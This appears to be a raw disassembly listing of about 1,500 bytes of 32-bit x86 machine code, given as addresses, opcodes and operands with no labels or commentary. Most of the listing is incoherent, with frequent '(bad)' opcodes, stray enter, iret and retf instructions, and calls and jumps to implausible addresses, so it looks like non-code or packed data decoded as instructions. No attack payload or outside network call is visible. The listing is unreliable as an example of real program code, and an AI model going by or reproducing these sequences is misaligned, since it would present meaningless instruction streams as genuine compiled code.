  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
